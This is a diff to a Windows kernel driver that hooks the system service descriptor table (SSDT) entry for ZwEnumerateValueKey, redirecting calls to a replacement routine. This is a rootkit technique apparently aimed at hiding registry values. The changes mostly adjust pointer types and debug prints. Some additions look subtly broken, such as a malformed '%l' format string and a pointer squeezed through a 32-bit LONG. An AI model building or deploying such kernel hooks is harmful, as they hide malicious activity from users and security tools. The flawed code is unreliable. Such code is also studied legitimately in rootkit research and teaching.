@@ -76,7 +76,7 @@ NTSTATUS NewZwEnumerateValueKey(IN HANDLE KeyHandle, IN ULONG Index, IN KEY_VALU
     return ntStatus;
 }
 
-PUCHAR HookSSDT(PUCHAR syscall, PUCHAR hookaddr) {
+PVOID HookSSDT(PVOID syscall, PVOID hookaddr) {
     UINT32 index;
     PLONG Pssdt;
 
@@ -91,15 +91,19 @@ PUCHAR HookSSDT(PUCHAR syscall, PUCHAR hookaddr) {
     DbgPrint("The address of the SSDT is: %x.\r\n", Pssdt);
 
     /* identify 'syscall' index into the SSDT table */
-    index = *((PULONG)(syscall + 0x1));
+    index = *((PULONG)((PUCHAR)syscall + 0x1));
     DbgPrint("The index into the SSDT table is: %d.\r\n", index);
 
     /* get the address of the service routine in SSDT */
-    target = (PLONG) & (Pssdt[index]);
+    target = &(Pssdt[index]);
     DbgPrint("The address of the SSDT routine to be hooked is: %x.\r\n", target);
 
     /* hook the service routine in SSDT */
-    return (PUCHAR)InterlockedExchange(target, hookaddr);
+    LONG interlockedReturn = InterlockedExchange(target, hookaddr);
+
+    DbgPrint("%l",interlockedReturn);
+    DbgPrint("%p", interlockedReturn);
+    return (PVOID)interlockedReturn;
 }
 
 
@@ -125,7 +129,7 @@ NTSTATUS InitDevice(
     );
     DbgPrint("WdfDeviceCreate has returned\n");
 
-    oldZwEnumerateValueKey = HookSSDT((PULONG)ZwEnumerateValueKey, (PULONG)NewZwEnumerateValueKey);
+    oldZwEnumerateValueKey = HookSSDT(&ZwEnumerateValueKey, &NewZwEnumerateValueKey);
     DbgPrint("hookSSDT has returned\n");
     EnableWP();
 
@@ -138,8 +142,9 @@ VOID Driver_EvtDriverUnload(_In_ WDFDRIVER Driver)
     UNREFERENCED_PARAMETER(Driver);
     DbgPrint("before unhooking");
     DbgPrint("The SSDT routine: %x.\r\n", target);
-    DbgPrint("address of OLDzwEnumValueKey: %x. \r\n", (PULONG)oldZwEnumerateValueKey);
-    DbgPrint("address of NEWzwEnumValueKey: %x. \r\n", (PULONG)NewZwEnumerateValueKey);
+    DbgPrint("address of OLDzwEnumValueKey: %p. \r\n", oldZwEnumerateValueKey);
+    DbgPrint("address of NEWzwEnumValueKey: %p. \r\n", (PULONG)NewZwEnumerateValueKey);
+    DbgPrint("address of NEWzwEnumValueKey: %p. \r\n", &NewZwEnumerateValueKey);
     //remove the hook
     InterlockedExchange(target, (PULONG)oldZwEnumerateValueKey);
     DbgPrint("after unhooking");
